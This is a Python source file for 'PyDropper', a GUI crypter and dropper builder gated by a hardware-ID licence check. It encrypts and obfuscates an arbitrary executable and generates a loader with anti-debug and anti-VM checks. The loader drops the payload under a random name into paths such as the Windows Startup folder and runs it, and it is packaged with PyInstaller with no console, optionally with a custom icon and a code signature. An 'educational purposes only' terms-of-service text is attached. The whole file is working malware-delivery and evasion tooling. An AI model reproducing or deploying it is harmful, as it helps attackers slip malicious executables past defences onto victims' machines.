import base64
import hashlib
import requests
import random
import uuid
import sys
from datetime import datetime, timedelta
import os
import shutil
import subprocess
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES, ChaCha20, DES3, Blowfish, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
from PIL import Image, ImageTk
import zlib

def generate_key(password: str) -> bytes:
    key = hashlib.sha256(password.encode()).digest()
    return key


def encrypt_url(url: str, key: bytes) -> str:
    iv = b'0123456789abcdef' 
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_url = encryptor.update(url.encode()) + encryptor.finalize()
    return base64.urlsafe_b64encode(iv + encrypted_url).decode()


def decrypt_url(encrypted_url: str, key: bytes) -> str:
    encrypted_url = base64.urlsafe_b64decode(encrypted_url.encode())
    iv = encrypted_url[:16]
    encrypted_url = encrypted_url[16:]
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    url = decryptor.update(encrypted_url) + decryptor.finalize()
    return url.decode()


password = "YOURPASSHERE"  
key = generate_key(password)


original_url = 'https://pastebin.com/raw/YOURLINKHERE'
encrypted_url = encrypt_url(original_url, key)


def fetch_hwid_list(encrypted_url, key):
    try:
        paste_url = decrypt_url(encrypted_url, key)
        response = requests.get(paste_url)
        if response.status_code == 200:
            hwid_list = [hwid.strip() for hwid in response.text.strip().split("\n") if hwid.strip()]
            return hwid_list
        else:
            print("Error fetching HWID list. Status code:", response.status_code)
            return None
    except Exception as e:
        print("Error fetching HWID list:", e)
        return None

def generate_hwid():
    try:
        baseboard_serial = subprocess.check_output("wmic baseboard get serialnumber", shell=True).decode().split("\n")[1].strip()
        hwid = hashlib.md5(baseboard_serial.encode()).hexdigest()
        return hwid
    except Exception as e:
        print("Error generating HWID:", e)
        return None

def check_hwid(stored_hwids):
    current_hwid = generate_hwid()
    if current_hwid is None:
        messagebox.showinfo("Error", "Failed to generate HWID.")
        return False
    if current_hwid in stored_hwids:
        messagebox.showinfo("Access Granted", "Welcome, Py_Dev.") #Your Name here..
        return True
    else:
        messagebox.showinfo("Access Denied", "Access Denied.")
        return False



stored_hwids = fetch_hwid_list(encrypted_url, key)
if stored_hwids is not None:
    if not check_hwid(stored_hwids):
        print("Access denied. Terminating script.")
        sys.exit()
else:
    print("Failed to fetch HWID list.")
    sys.exit()

print("Access granted. Proceeding with the rest of the script...")


tos_text = """
PyDropper Terms of Service (ToS)

1. Introduction

   Welcome to PyDropper. PyDropper is a tool developed for educational purposes to assist cybersecurity students in understanding the mechanics of cybersecurity threats and defenses. By accessing or using PyDropper, you agree to comply with and be bound by the following terms and conditions.

2. Educational Purpose Only

   PyDropper is intended solely for educational purposes. This tool is designed to help cybersecurity students learn about security threats, vulnerabilities, and defenses in a controlled, legal, and ethical manner.

3. Disclaimer of Liability

   By using PyDropper, you acknowledge and agree to the following:
   - No Warranty: PyDropper is provided "as is" without any warranties of any kind, either express or implied.
   - No Liability: The creators and distributors of PyDropper are not liable for any damages, loss of data, or any other losses that may result from the use of this tool. You use PyDropper at your own risk.
   - Misuse: Any misuse of PyDropper, including but not limited to using it for illegal activities, malicious purposes, or any actions that cause harm to individuals, organizations, or systems, is strictly prohibited. The creators and distributors of PyDropper are not responsible for any misuse of the tool.

4. User Responsibility

   As a user of PyDropper, you agree to:
   - Use Ethically and Legally: Use PyDropper in an ethical and legal manner, respecting all applicable laws and regulations.
   - Educational Use: Use PyDropper only for educational purposes and within a controlled environment, such as a lab or sandbox environment, to prevent any unintentional harm.
   - Responsible Usage: Ensure that your use of PyDropper does not compromise the security, privacy, or functionality of any system that is not owned or authorized by you.
   - Compliance: Adhere to all local, state, national, and international laws governing the use of cybersecurity tools.

5. Indemnification

   You agree to indemnify and hold harmless the creators and distributors of PyDropper from any claims, damages, liabilities, costs, or expenses (including legal fees) arising from your use or misuse of the tool.

6. Amendments

   The creators and distributors of PyDropper reserve the right to amend these terms of service at any time. Your continued use of PyDropper after any such amendments constitutes your acceptance of the new terms.

7. Governing Law

   These terms of service are governed by and construed in accordance with the laws of the jurisdiction in which the user of PyDropper resides, without regard to its conflict of law principles.

8. Contact Information

   If you have any questions or concerns about these terms of service, please contact the creators and distributors of PyDropper.

9. Acceptance of Terms

   By using PyDropper, you acknowledge that you have read, understood, and agree to be bound by these terms and conditions.
"""

def on_accept():
    window.destroy()

def on_decline():
    if messagebox.askyesno("Info", "You must accept the Terms of Service to use this program. Do you want to exit?"):
        window.destroy()
        exit()

def on_window_close():
    on_decline()

window = tk.Tk()
window.title("Terms of Service") 
window.protocol("WM_DELETE_WINDOW", on_window_close)

text = tk.Text(window, wrap="word", height=30, width=80)
text.insert("1.0", tos_text)
text.config(state="disabled")
text.pack(padx=10, pady=10)

button_frame = tk.Frame(window)
button_frame.pack(pady=10)

accept_button = tk.Button(button_frame, text="Accept", command=on_accept)
accept_button.pack(side="left", padx=5)

decline_button = tk.Button(button_frame, text="Decline", command=on_decline)
decline_button.pack(side="right", padx=5)

window.mainloop()

ENCRYPTION_MODES = {
    1: {'algo': 'AES', 'mode': AES.MODE_CBC, 'name': 'AES-CBC'},
    2: {'algo': 'AES', 'mode': AES.MODE_CFB, 'name': 'AES-CFB'},
    3: {'algo': 'AES', 'mode': AES.MODE_OFB, 'name': 'AES-OFB'},
    4: {'algo': 'AES', 'mode': AES.MODE_GCM, 'name': 'AES-GCM'},
    5: {'algo': 'ChaCha20', 'mode': None, 'name': 'ChaCha20'},
    6: {'algo': '3DES', 'mode': DES3.MODE_ECB, 'name': '3DES-ECB'},
    7: {'algo': 'Blowfish', 'mode': None, 'name': 'Blowfish'}
}

SAVE_PATHS = [
    "C:\\ProgramData",
    "C:\\Users\\Public\\Documents",
    "C:\\Users\\Public\\Downloads",
    "C:\\Users\\Public\\Desktop",
    "C:\\Users\\{username}\\AppData",
    "C:\\Users\\{username}\\Downloads",
    "C:\\Users\\{username}\\Pictures",
    "C:\\ProgramData\\Microsoft\\Settings",
    "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp",
    "C:\\Windows\\Temp"
]

def generate_keys(algo='RSA', key_size=2048):
    if algo == 'RSA':
        key = RSA.generate(key_size)
        private_key = key.export_key(format='PEM').decode('utf-8')
        public_key = key.publickey().export_key(format='PEM').decode('utf-8')
    return private_key, public_key

def obfuscate(data):
    key = get_random_bytes(1)[0]
    obfuscated_data = bytearray(data)
    for i in range(len(obfuscated_data)):
        obfuscated_data[i] ^= key
    return bytes([key]) + obfuscated_data


def encrypt_file(file_path, public_key, encryption_mode, key_size, compression):
    with open(file_path, 'rb') as f:
        data = f.read()

    
    data = obfuscate(data)

    if compression:
        data = zlib.compress(data)

    if encryption_mode['algo'] == 'AES':
        aes_key = get_random_bytes(key_size // 8)
        if encryption_mode['mode'] in [AES.MODE_ECB, AES.MODE_CBC, AES.MODE_CFB, AES.MODE_OFB]:
            iv = get_random_bytes(AES.block_size) if encryption_mode['mode'] != AES.MODE_ECB else None
            cipher = AES.new(aes_key, encryption_mode['mode'], iv=iv)
            ciphertext = cipher.encrypt(pad(data, AES.block_size))
            nonce = iv
            tag = None
        elif encryption_mode['mode'] == AES.MODE_GCM:
            cipher = AES.new(aes_key, encryption_mode['mode'])
            nonce = cipher.nonce
            ciphertext, tag = cipher.encrypt_and_digest(data)
        else:
            raise ValueError("Unsupported AES mode")
    elif encryption_mode['algo'] == 'ChaCha20':
        chacha_key = get_random_bytes(32)
        cipher = ChaCha20.new(key=chacha_key)
        nonce = cipher.nonce
        ciphertext = cipher.encrypt(data)
        tag = None
        aes_key = chacha_key
    elif encryption_mode['algo'] == '3DES':
        des3_key = DES3.adjust_key_parity(get_random_bytes(24))
        cipher = DES3.new(des3_key, encryption_mode['mode'])
        ciphertext = cipher.encrypt(pad(data, DES3.block_size))
        nonce = None
        tag = None
        aes_key = des3_key
    elif encryption_mode['algo'] == 'Blowfish':
        blowfish_key = get_random_bytes(32)
        mode = Blowfish.MODE_ECB
        cipher = Blowfish.new(blowfish_key, mode)
        ciphertext = cipher.encrypt(pad(data, 8))
        nonce = None
        tag = None
        aes_key = blowfish_key

    if encryption_mode['algo'] in ['AES', 'ChaCha20', '3DES', 'Blowfish']:
        rsa_key = RSA.import_key(public_key)
        rsa_cipher = PKCS1_OAEP.new(rsa_key)
        encrypted_aes_key = rsa_cipher.encrypt(aes_key)
    else:
        encrypted_aes_key = None

    encrypted_data = {
        'nonce': b64encode(nonce).decode('utf-8') if nonce else '',
        'ciphertext': b64encode(ciphertext).decode('utf-8'),
        'tag': b64encode(tag).decode('utf-8') if tag else '',
        'encrypted_aes_key': b64encode(encrypted_aes_key).decode('utf-8') if encrypted_aes_key else '',
        'encryption_mode': encryption_mode['name'],
        'compression': compression
    }

    return encrypted_data

def create_loader_script(private_key, encrypted_data, anti_debug, anti_vm, save_path, icon_path=None):
    loader_script = f"""
from Crypto.Cipher import AES, PKCS1_OAEP, ChaCha20, DES3, Blowfish
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import unpad
from base64 import b64decode
import subprocess
import zlib
import os
import platform
import random
import string
import getpass

encrypted_data = {encrypted_data}
private_key = '''{private_key}'''

def is_debugger_present():
    return any('PYDEV' in arg for arg in os.environ.keys())

def is_vm():
    return platform.system() == "Linux" and os.path.isfile('/.dockerenv')

def deobfuscate(data):
    key = data[0]
    deobfuscated_data = bytearray(data[1:])
    for i in range(len(deobfuscated_data)):
        deobfuscated_data[i] ^= key
    return bytes(deobfuscated_data)
    
def decrypt_file():
    if {anti_debug} and is_debugger_present():
        print("Debugger detected, exiting.")
        exit(1)
    
    if {anti_vm} and is_vm():
        print("Virtual machine detected, exiting.")
        exit(1)

    nonce = b64decode(encrypted_data['nonce']) if encrypted_data.get('nonce') else None
    ciphertext = b64decode(encrypted_data['ciphertext'])
    tag = b64decode(encrypted_data['tag']) if encrypted_data.get('tag') else None
    encrypted_aes_key = b64decode(encrypted_data['encrypted_aes_key']) if encrypted_data.get('encrypted_aes_key') else None

    mode = encrypted_data['encryption_mode']
    if mode == 'AES-ECB':
        rsa_key = RSA.import_key(private_key)
        rsa_cipher = PKCS1_OAEP.new(rsa_key)
        aes_key = rsa_cipher.decrypt(encrypted_aes_key)
        cipher = AES.new(aes_key, AES.MODE_ECB)
        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
    elif mode == 'AES-CBC':
        rsa_key = RSA.import_key(private_key)
        rsa_cipher = PKCS1_OAEP.new(rsa_key)
        aes_key = rsa_cipher.decrypt(encrypted_aes_key)
        iv = nonce  # Assuming nonce is used as the IV for AES-CBC
        cipher = AES.new(aes_key, AES.MODE_CBC, iv=iv)
        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
    elif mode == 'AES-CFB':
        rsa_key = RSA.import_key(private_key)
        rsa_cipher = PKCS1_OAEP.new(rsa_key)
        aes_key = rsa_cipher.decrypt(encrypted_aes_key)
        iv = nonce  # Assuming nonce is used as the IV for AES-CFB
        cipher = AES.new(aes_key, AES.MODE_CFB, iv=iv)
        decrypted_data = cipher.decrypt(ciphertext)
    elif mode == 'AES-OFB':
        rsa_key = RSA.import_key(private_key)
        rsa_cipher = PKCS1_OAEP.new(rsa_key)
        aes_key = rsa_cipher.decrypt(encrypted_aes_key)
        iv = nonce  # Assuming nonce is used as the IV for AES-OFB
        cipher = AES.new(aes_key, AES.MODE_OFB, iv=iv)
        decrypted_data = cipher.decrypt(ciphertext)
    elif mode == 'AES-GCM':
        rsa_key = RSA.import_key(private_key)
        rsa_cipher = PKCS1_OAEP.new(rsa_key)
        aes_key = rsa_cipher.decrypt(encrypted_aes_key)
        nonce = nonce  # Assuming nonce is used as the nonce for AES-GCM
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
    elif mode == 'ChaCha20':
        rsa_key = RSA.import_key(private_key)
        rsa_cipher = PKCS1_OAEP.new(rsa_key)
        chacha_key = rsa_cipher.decrypt(encrypted_aes_key)
        cipher = ChaCha20.new(key=chacha_key, nonce=nonce)
        decrypted_data = cipher.decrypt(ciphertext)
    elif mode == '3DES-ECB':
        rsa_key = RSA.import_key(private_key)
        rsa_cipher = PKCS1_OAEP.new(rsa_key)
        des3_key = rsa_cipher.decrypt(encrypted_aes_key)
        cipher = DES3.new(des3_key, DES3.MODE_ECB)
        decrypted_data = unpad(cipher.decrypt(ciphertext), DES3.block_size)
    elif mode == 'Blowfish':
        rsa_key = RSA.import_key(private_key)
        rsa_cipher = PKCS1_OAEP.new(rsa_key)
        blowfish_key = rsa_cipher.decrypt(encrypted_aes_key)
        cipher = Blowfish.new(key=blowfish_key, mode=Blowfish.MODE_ECB)
        decrypted_data = unpad(cipher.decrypt(ciphertext), 8)

    if encrypted_data['compression']:
        decrypted_data = zlib.decompress(decrypted_data)
    
    # Deobfuscate the decrypted data
    decrypted_data = deobfuscate(decrypted_data)

    return decrypted_data

decrypted_data = decrypt_file()

def generate_random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

random_filename = generate_random_string() + '.exe'

username = getpass.getuser()
save_path = r"{save_path}".replace("{{username}}", username)

decrypted_exe_path = os.path.join(save_path, random_filename)

with open(decrypted_exe_path, 'wb') as f:
    f.write(decrypted_data)

subprocess.call(decrypted_exe_path, shell=True)
"""
    
    # Save loader.py in the current directory (where encryptor.py is located)
    current_dir = os.getcwd()
    loader_script_path = os.path.join(current_dir, 'loader.py')
    with open(loader_script_path, 'w') as f:
        f.write(loader_script)
    
    print(f"Creating loader script at {loader_script_path}")
        
    pyinstaller_command = ['pyinstaller', '--onefile', '--windowed', '--noconsole', loader_script_path]
    if icon_path:
        pyinstaller_command.extend(['--icon', icon_path])
    
    result = subprocess.run(pyinstaller_command, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"PyInstaller failed with error: {result.stderr}")
        return False

    dist_path = os.path.join(current_dir, 'dist', 'loader.exe')
    print(f"Checking if {dist_path} exists...")
    if not os.path.exists(dist_path):
        print(f"Error: {dist_path} does not exist.")
        return False
    
    loader_exe_path = os.path.join(current_dir, 'loader.exe')
    os.rename(dist_path, loader_exe_path)
    shutil.rmtree(os.path.join(current_dir, 'build'))
    shutil.rmtree(os.path.join(current_dir, 'dist'))
    os.remove(loader_script_path)
    os.remove(os.path.join(current_dir, 'loader.spec'))
     
    messagebox.showinfo("Success", "loader.exe was built correctly.") 
     
    return True

def main():
    def browse_file():
        file_path = filedialog.askopenfilename(filetypes=[("Executable files", "*.exe")])
        if file_path:
            exe_path.set(file_path)

    def browse_icon():
        file_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if file_path:
            file_path = file_path.replace("\\", "\\\\")
            icon_path.set(file_path)

    def browse_cert():
        file_path = filedialog.askopenfilename(filetypes=[("PFX files", "*.pfx")])
        if file_path:
            cert_path.set(file_path)

    def browse_signtool():
        file_path = filedialog.askopenfilename(filetypes=[("Executable files", "*.exe")])
        if file_path:
            signtool_path.set(file_path)

    def create_exe():
        encryption_mode_number = int(encryption_choice.get().split('.')[0])  # Extract mode number
        encryption_mode = ENCRYPTION_MODES[encryption_mode_number]  # Get encryption mode

        key_size = 256 if encryption_mode['algo'] == 'AES' else None
        if encryption_mode['algo'] == 'AES':
            key_size = int(aes_key_size.get())
        elif encryption_mode['algo'] == 'ChaCha20':
            key_size = 256
        elif encryption_mode['algo'] == '3DES':
            key_size = 192
        elif encryption_mode['algo'] == 'Blowfish':
            key_size = 256

        compression = compression_choice.get() == 'yes'
        anti_debug = anti_debug_choice.get() == 'yes'
        anti_vm = anti_vm_choice.get() == 'yes'
        save_path = save_path_var.get()
        if save_path == "Enter custom path":
            save_path = filedialog.askdirectory()
            if not save_path:
                messagebox.showerror("Error", "No save path selected.")
                return

        print(f"Save path: {save_path}")

        private_key, public_key = generate_keys(algo='RSA')
        encrypted_data = encrypt_file(exe_path.get(), public_key, encryption_mode, key_size, compression)

        if not create_loader_script(private_key, encrypted_data, anti_debug, anti_vm, save_path, icon_path.get() if icon_path.get() else None):
            messagebox.showerror("Error", "Failed to create loader script.")
            return

        if add_signature.get():
            # Certificate Signing
            cert_file_path = cert_path.get()
            cert_password = cert_password_var.get()
            timestamp_url = "http://timestamp.digicert.com"
            signtool_path_value = signtool_path.get()
            loader_file_path = os.path.abspath('loader.exe')

            print(f"Signing loader executable at {loader_file_path} with {signtool_path_value}")
            sign_command = [
                signtool_path_value, 'sign', '/f', cert_file_path, '/p', cert_password,
                '/tr', timestamp_url, '/td', 'SHA256', '/fd', 'SHA256', '/v', loader_file_path
            ]

            result = subprocess.run(sign_command, capture_output=True, text=True)
            if result.returncode != 0:
                messagebox.showerror("Error", f"Signtool failed with error: {result.stderr}")
            else:
                messagebox.showinfo("Success", "Loader executable signed successfully.")

    root = tk.Tk()
    root.title("PyDropper")
    root.geometry("550x450")

    main_frame = ttk.Frame(root, padding="10 10 10 10")
    main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

    root.columnconfigure(0, weight=1)
    root.rowconfigure(0, weight=1)

   

    # Select executable
    ttk.Label(main_frame, text="Select executable:").grid(row=0, column=0, padx=(10, 5), pady=5, sticky="e")
    exe_path = tk.StringVar()
    ttk.Entry(main_frame, textvariable=exe_path, width=40).grid(row=0, column=1, padx=(0, 10), pady=5, sticky="w")
    ttk.Button(main_frame, text="Browse", command=browse_file).grid(row=0, column=2, padx=(0, 10), pady=5, sticky="w")

    ttk.Label(main_frame, text="Select encryption mode:").grid(row=1, column=0, padx=10, pady=5, sticky="e")
    encryption_choice = tk.StringVar()
    ttk.Combobox(main_frame, textvariable=encryption_choice, values=[f"{key}. {value['name']}" for key, value in ENCRYPTION_MODES.items()]).grid(row=1, column=1, padx=10, pady=5, sticky="w")

    ttk.Label(main_frame, text="AES key size (128, 192, 256):").grid(row=2, column=0, padx=(10, 5), pady=5, sticky="e")
    aes_key_size = tk.StringVar(value="256")
    ttk.Entry(main_frame, textvariable=aes_key_size, width=10).grid(row=2, column=1, padx=(0, 10), pady=5, sticky="w")

    ttk.Label(main_frame, text="Enable compression?").grid(row=3, column=0, padx=10, pady=5, sticky="e")
    compression_choice = tk.StringVar(value="no")
    ttk.Combobox(main_frame, textvariable=compression_choice, values=["yes", "no"]).grid(row=3, column=1, padx=10, pady=5, sticky="w")

    ttk.Label(main_frame, text="Enable anti-debug?").grid(row=4, column=0, padx=10, pady=5, sticky="e")
    anti_debug_choice = tk.StringVar(value="no")
    ttk.Combobox(main_frame, textvariable=anti_debug_choice, values=["yes", "no"]).grid(row=4, column=1, padx=10, pady=5, sticky="w")

    ttk.Label(main_frame, text="Enable anti-VM?").grid(row=5, column=0, padx=10, pady=5, sticky="e")
    anti_vm_choice = tk.StringVar(value="no")
    ttk.Combobox(main_frame, textvariable=anti_vm_choice, values=["yes", "no"]).grid(row=5, column=1, padx=10, pady=5, sticky="w")

    ttk.Label(main_frame, text="Icon path (optional):").grid(row=6, column=0, padx=(10, 5), pady=5, sticky="e")
    icon_path = tk.StringVar()
    ttk.Entry(main_frame, textvariable=icon_path, width=40).grid(row=6, column=1, padx=(0, 10), pady=5, sticky="w")
    ttk.Button(main_frame, text="Browse", command=browse_icon).grid(row=6, column=2, padx=(0, 10), pady=5, sticky="w")

    # Add Digital Signature option
    add_signature = tk.BooleanVar()
    ttk.Checkbutton(main_frame, text="Add Digital Signature", variable=add_signature).grid(row=7, column=0, columnspan=3, pady=(10, 5))

    # Certificate file (.pfx)
    ttk.Label(main_frame, text="Certificate file (.pfx):").grid(row=8, column=0, padx=(10, 5), pady=5, sticky="e")
    cert_path = tk.StringVar()
    ttk.Entry(main_frame, textvariable=cert_path, width=40).grid(row=8, column=1, padx=(0, 10), pady=5, sticky="w")
    ttk.Button(main_frame, text="Browse", command=browse_cert).grid(row=8, column=2, padx=(0, 10), pady=5, sticky="w")

    ttk.Label(main_frame, text="Certificate password:").grid(row=9, column=0, padx=(10, 5), pady=5, sticky="e")
    cert_password_var = tk.StringVar()
    ttk.Entry(main_frame, textvariable=cert_password_var, show="*", width=40).grid(row=9, column=1, padx=(0, 10), pady=5, sticky="w")

    ttk.Label(main_frame, text="Signtool path:").grid(row=10, column=0, padx=(10, 5), pady=5, sticky="e")
    signtool_path = tk.StringVar()
    ttk.Entry(main_frame, textvariable=signtool_path, width=40).grid(row=10, column=1, padx=(0, 10), pady=5, sticky="w")
    ttk.Button(main_frame, text="Browse", command=browse_signtool).grid(row=10, column=2, padx=(0, 10), pady=5, sticky="w")

    # Save path
    ttk.Label(main_frame, text="Save path:").grid(row=11, column=0, padx=(10, 5), pady=5, sticky="e")
    save_path_var = tk.StringVar(value=SAVE_PATHS[0])
    ttk.Combobox(main_frame, textvariable=save_path_var, values=SAVE_PATHS + ["Enter custom path"], width=35).grid(row=11, column=1, padx=(0, 10), pady=5, sticky="ew")

    ttk.Button(main_frame, text="Create Loader", command=create_exe).grid(row=12, column=0, columnspan=3, pady=(10, 10))

    root.mainloop()

if __name__ == "__main__":
    main()
